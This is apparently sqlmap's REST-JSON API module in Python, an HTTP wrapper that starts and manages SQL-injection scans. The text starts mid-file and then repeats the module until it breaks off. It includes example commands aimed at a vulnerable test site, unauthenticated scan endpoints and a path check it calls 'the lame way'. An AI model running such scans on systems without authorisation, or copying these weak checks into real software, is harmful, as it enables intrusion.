        return jsonize({"success": False, "message": "Invalid task ID"})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug("[%s] Started scan" % taskid)
    return jsonize({"success": True, "engineid": DataStore.tasks[taskid].engine_get_id()})


@get("/scan/<taskid>/stop")
def scan_stop(taskid):
    """
    Stop a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_stop()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_stop()

    logger.debug("[%s] Stopped scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/kill")
def scan_kill(taskid):
    """
    Kill a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_kill()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_kill()

    logger.debug("[%s] Killed scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/status")
def scan_status(taskid):
    """
    Returns status of a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_status()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if DataStore.tasks[taskid].engine_process() is None:
        status = "not running"
    else:
        status = "terminated" if DataStore.tasks[taskid].engine_has_terminated() is True else "running"

    logger.debug("[%s] Retrieved scan status" % taskid)
    return jsonize({
        "success": True,
        "status": status,
        "returncode": DataStore.tasks[taskid].engine_get_returncode()
    })


@get("/scan/<taskid>/data")
def scan_data(taskid):
    """
    Retrieve the data of a scan
    """
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_data()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            "SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_data_message.append(
            {"status": status, "type": content_type, "value": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            "SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug("[%s] Retrieved scan data and error messages" % taskid)
    return jsonize({"success": True, "data": json_data_message, "error": json_errors_message})


# Functions to handle scans' logs
@get("/scan/<taskid>/log/<start>/<end>")
def scan_log_limited(taskid, start, end):
    """
    Retrieve a subset of log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning("[%s] Invalid start or end value provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid start or end value, must be digits"})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ("SELECT time, level, message FROM logs WHERE "
             "taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC"),
            (taskid, start, end)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages subset" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


@get("/scan/<taskid>/log")
def scan_log(taskid):
    """
    Retrieve the log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            "SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC", (taskid,)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


# Function to handle files inside the output directory
@get("/download/<taskid>/<target>/<filename:path>")
def download(taskid, target, filename):
    """
    Download a certain file from the file system
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to download()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Prevent file path traversal - the lame way
    if ".." in target:                    
        logger.warning("[%s] Forbidden path (%s)" % (taskid, target))
        return jsonize({"success": False, "message": "Forbidden path"})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)                    

    if os.path.exists(path):                    
        logger.debug("[%s] Retrieved content of file %s" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({"success": True, "file": file_content.encode("base64")})
    else:
        logger.warning("[%s] File does not exist %s" % (taskid, target))
        return jsonize({"success": False, "message": "File does not exist"})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """
    REST-JSON API server
    """
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix="sqlmapipc-", text=False)[1]

    logger.info("Running REST-JSON API server at '%s:%d'.." % (host, port))
    logger.info("Admin ID: %s" % DataStore.admin_id)
    logger.debug("IPC database: %s" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == "gevent":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == "eventlet":
            import eventlet
            eventlet.monkey_patch()
        logger.debug("Using adapter '%s' to run bottle" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if "already in use" in getSafeExString(ex):
            logger.error("Address already in use ('%s:%s')" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = "Adapter '%s' is not available on this system" % adapter
        if adapter in ("gevent", "eventlet"):
            errMsg += " (e.g.: 'sudo apt-get install python-%s')" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug("Calling %s" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error("Failed to load and parse %s" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """
    REST-JSON API client
    """

    dbgMsg = "Example client access from command line:"
    dbgMsg += "\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid" % (host, port)
    dbgMsg += "\n\t$ curl -H \"Content-Type: application/json\" -X POST -d '{\"url\": \"http://testphp.vulnweb.com/artists.php?artist=1\"}' http://%s:%d/scan/$taskid/start" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/data" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/log" % (host, port)
    logger.debug(dbgMsg)

    addr = "http://%s:%d" % (host, port)
    logger.info("Starting REST-JSON API client to '%s'..." % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = "There has been a problem while connecting to the "
            errMsg += "REST-JSON API server at '%s' " % addr
            errMsg += "(%s)" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info("Type 'help' or '?' for list of available commands")

    while True:
        try:
            command = raw_input("api%s> " % (" (%s)" % taskid if taskid else "")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in ("data", "log", "status", "stop", "kill"):
            if not taskid:
                logger.error("No task ID in use")
                continue
            raw = _client("%s/scan/%s/%s" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            dataToStdout("%s\n" % raw)

        elif command.startswith("new"):
            if ' ' not in command:
                logger.error("Program arguments are missing")
                continue

            argv = ["sqlmap.py"] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client("%s/task/new" % addr)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to create new task")
                continue
            taskid = res["taskid"]
            logger.info("New task ID is '%s'" % taskid)

            raw = _client("%s/scan/%s/start" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to start scan")
                continue
            logger.info("Scanning started")

        elif command.startswith("use"):
            taskid = (command.split()[1] if ' ' in command else "").strip("'\"")
            if not taskid:
                logger.error("Task ID is missing")
                taskid = None
                continue
            elif not re.search(r"\A[0-9a-fA-F]{16}\Z", taskid):
                logger.error("Invalid task ID '%s'" % taskid)
                taskid = None
                continue
            logger.info("Switching to task ID '%s' " % taskid)

        elif command in ("list", "flush"):
            raw = _client("%s/admin/%s/%s" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            elif command == "flush":
                taskid = None
            dataToStdout("%s\n" % raw)

        elif command in ("exit", "bye", "quit", 'q'):
            return

        elif command in ("help", "?"):
            msg =  "help        Show this help message\n"
            msg += "new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \"http://testphp.vulnweb.com/artists.php?artist=1\"')\n"
            msg += "use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n"
            msg += "data        Retrieve and show data for current task\n"
            msg += "log         Retrieve and show log for current task\n"
            msg += "status      Retrieve and show status for current task\n"
            msg += "stop        Stop current task\n"
            msg += "kill        Kill current task\n"
            msg += "list        Display all tasks\n"
            msg += "flush       Flush tasks (delete all tasks)\n"
            msg += "exit        Exit this client\n"

            dataToStdout(msg)

        elif command:
            logger.error("Unknown command '%s'" % command)

#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = ""
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who="server"):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug("REST-JSON API %s connected to IPC database" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not "locked" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith("SELECT"):
            return self.cursor.fetchall()

    def init(self):
        self.execute("CREATE TABLE logs("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, time TEXT, "
                  "level TEXT, message TEXT"
                  ")")

        self.execute("CREATE TABLE data("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, status INTEGER, "
                  "content_type INTEGER, value TEXT"
                  ")")

        self.execute("CREATE TABLE errors("
                    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                    "taskid INTEGER, error TEXT"
                    ")")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {"boolean": False, "string": None, "integer": None, "float": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists("sqlmap.py"):
            self.process = Popen(["python", "sqlmap.py", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen(["sqlmap", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype="stdout"):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == "stdout":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == "stdout":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                "SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute("DELETE FROM data WHERE id = ?",
                                                     (output[index][0],))

                conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = "%s%s" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute("UPDATE data SET value = ? WHERE id = ?",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute("INSERT INTO errors VALUES(NULL, ?, ?)",
                                         (self.taskid, str(value) if value else ""))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """
        conf.database_cursor.execute("INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)",
                                     (conf.taskid, time.strftime("%X"), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, "api"):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect("client")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, "%s ('%s')" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook("after_request")
def security_headers(json_header=True):
    """
    Set some headers across all HTTP responses
    """
    response.headers["Server"] = "Server"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Pragma"] = "no-cache"
    response.headers["Cache-Control"] = "no-cache"
    response.headers["Expires"] = "0"
    if json_header:
        response.content_type = "application/json; charset=UTF-8"

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return "Access denied"


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return "Nothing here"


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return "Method not allowed"


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return "Internal server error"

#############################
# Task management functions #
#############################


# Users' methods
@get("/task/new")
def task_new():
    """
    Create new task ID
    """
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug("Created new task: '%s'" % taskid)
    return jsonize({"success": True, "taskid": taskid})


@get("/task/<taskid>/delete")
def task_delete(taskid):
    """
    Delete own task ID
    """
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug("[%s] Deleted task" % taskid)
        return jsonize({"success": True})
    else:
        logger.warning("[%s] Invalid task ID provided to task_delete()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

###################
# Admin functions #
###################


@get("/admin/<taskid>/list")
def task_list(taskid=None):
    """
    List task pull
    """
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))["status"]

    logger.debug("[%s] Listed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True, "tasks": tasks, "tasks_num": len(tasks)})

@get("/admin/<taskid>/flush")
def task_flush(taskid):
    """
    Flush task spool (delete all tasks)
    """

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug("[%s] Flushed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get("/option/<taskid>/list")
def option_list(taskid):
    """
    List options for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_list()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    logger.debug("[%s] Listed task options" % taskid)
    return jsonize({"success": True, "options": DataStore.tasks[taskid].get_options()})


@post("/option/<taskid>/get")
def option_get(taskid):
    """
    Get the value of an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_get()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    option = request.json.get("option", "")

    if option in DataStore.tasks[taskid].options:
        logger.debug("[%s] Retrieved value for option %s" % (taskid, option))
        return jsonize({"success": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug("[%s] Requested value for unknown option %s" % (taskid, option))
        return jsonize({"success": False, "message": "Unknown option", option: "not set"})


@post("/option/<taskid>/set")
def option_set(taskid):
    """
    Set an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_set()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug("[%s] Requested to set options" % taskid)
    return jsonize({"success": True})


# Handle scans
@post("/scan/<taskid>/start")
def scan_start(taskid):
    """
    Launch a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_start()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug("[%s] Started scan" % taskid)
    return jsonize({"success": True, "engineid": DataStore.tasks[taskid].engine_get_id()})


@get("/scan/<taskid>/stop")
def scan_stop(taskid):
    """
    Stop a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_stop()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_stop()

    logger.debug("[%s] Stopped scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/kill")
def scan_kill(taskid):
    """
    Kill a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_kill()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_kill()

    logger.debug("[%s] Killed scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/status")
def scan_status(taskid):
    """
    Returns status of a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_status()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if DataStore.tasks[taskid].engine_process() is None:
        status = "not running"
    else:
        status = "terminated" if DataStore.tasks[taskid].engine_has_terminated() is True else "running"

    logger.debug("[%s] Retrieved scan status" % taskid)
    return jsonize({
        "success": True,
        "status": status,
        "returncode": DataStore.tasks[taskid].engine_get_returncode()
    })


@get("/scan/<taskid>/data")
def scan_data(taskid):
    """
    Retrieve the data of a scan
    """
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_data()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            "SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_data_message.append(
            {"status": status, "type": content_type, "value": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            "SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug("[%s] Retrieved scan data and error messages" % taskid)
    return jsonize({"success": True, "data": json_data_message, "error": json_errors_message})


# Functions to handle scans' logs
@get("/scan/<taskid>/log/<start>/<end>")
def scan_log_limited(taskid, start, end):
    """
    Retrieve a subset of log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning("[%s] Invalid start or end value provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid start or end value, must be digits"})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ("SELECT time, level, message FROM logs WHERE "
             "taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC"),
            (taskid, start, end)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages subset" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


@get("/scan/<taskid>/log")
def scan_log(taskid):
    """
    Retrieve the log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            "SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC", (taskid,)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


# Function to handle files inside the output directory
@get("/download/<taskid>/<target>/<filename:path>")
def download(taskid, target, filename):
    """
    Download a certain file from the file system
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to download()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Prevent file path traversal - the lame way
    if ".." in target:                    
        logger.warning("[%s] Forbidden path (%s)" % (taskid, target))
        return jsonize({"success": False, "message": "Forbidden path"})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)                    

    if os.path.exists(path):                    
        logger.debug("[%s] Retrieved content of file %s" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({"success": True, "file": file_content.encode("base64")})
    else:
        logger.warning("[%s] File does not exist %s" % (taskid, target))
        return jsonize({"success": False, "message": "File does not exist"})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """
    REST-JSON API server
    """
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix="sqlmapipc-", text=False)[1]

    logger.info("Running REST-JSON API server at '%s:%d'.." % (host, port))
    logger.info("Admin ID: %s" % DataStore.admin_id)
    logger.debug("IPC database: %s" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == "gevent":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == "eventlet":
            import eventlet
            eventlet.monkey_patch()
        logger.debug("Using adapter '%s' to run bottle" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if "already in use" in getSafeExString(ex):
            logger.error("Address already in use ('%s:%s')" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = "Adapter '%s' is not available on this system" % adapter
        if adapter in ("gevent", "eventlet"):
            errMsg += " (e.g.: 'sudo apt-get install python-%s')" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug("Calling %s" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error("Failed to load and parse %s" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """
    REST-JSON API client
    """

    dbgMsg = "Example client access from command line:"
    dbgMsg += "\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid" % (host, port)
    dbgMsg += "\n\t$ curl -H \"Content-Type: application/json\" -X POST -d '{\"url\": \"http://testphp.vulnweb.com/artists.php?artist=1\"}' http://%s:%d/scan/$taskid/start" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/data" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/log" % (host, port)
    logger.debug(dbgMsg)

    addr = "http://%s:%d" % (host, port)
    logger.info("Starting REST-JSON API client to '%s'..." % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = "There has been a problem while connecting to the "
            errMsg += "REST-JSON API server at '%s' " % addr
            errMsg += "(%s)" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info("Type 'help' or '?' for list of available commands")

    while True:
        try:
            command = raw_input("api%s> " % (" (%s)" % taskid if taskid else "")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in ("data", "log", "status", "stop", "kill"):
            if not taskid:
                logger.error("No task ID in use")
                continue
            raw = _client("%s/scan/%s/%s" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            dataToStdout("%s\n" % raw)

        elif command.startswith("new"):
            if ' ' not in command:
                logger.error("Program arguments are missing")
                continue

            argv = ["sqlmap.py"] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client("%s/task/new" % addr)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to create new task")
                continue
            taskid = res["taskid"]
            logger.info("New task ID is '%s'" % taskid)

            raw = _client("%s/scan/%s/start" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to start scan")
                continue
            logger.info("Scanning started")

        elif command.startswith("use"):
            taskid = (command.split()[1] if ' ' in command else "").strip("'\"")
            if not taskid:
                logger.error("Task ID is missing")
                taskid = None
                continue
            elif not re.search(r"\A[0-9a-fA-F]{16}\Z", taskid):
